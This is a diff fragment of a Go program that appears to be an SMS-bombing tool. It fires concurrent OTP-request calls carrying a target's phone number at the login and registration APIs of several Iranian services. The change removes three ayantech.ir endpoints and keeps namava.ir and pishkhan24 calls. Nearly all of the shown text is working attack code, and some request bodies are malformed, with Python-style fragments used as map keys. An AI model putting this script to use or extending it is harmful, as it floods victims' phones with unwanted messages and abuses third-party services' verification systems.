@@ -378,15 +378,6 @@ func main() {
 		go sms("https://www.namava.ir/api/v1.0/accounts/registrations/by-otp/request", map[string]interface{}{
 			"UserName": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{
-			"'Parameters': {'ApplicationType': 'Web','ApplicationUniqueToken': None, 'ApplicationVersion': '1.0.0','MobileNumber': +": phone,
-		}, ch) //i don't know
-		go sms("https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/getLoginMethod", map[string]interface{}{
-			"MobileNumber": phone,
-		}, ch)  // edit :4/22/2025
-		go sms("https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{
-			"MobileNumber": phone,
-		}, ch)  // edit :4/22/2025
 		go sms("https://core.pishkhan24.ayantech.ir/webservices/core.svc/v1/LoginByOTP", map[string]interface{}{
 			"null, Username": phone,
 		}, ch)  // edit :4/22/2025
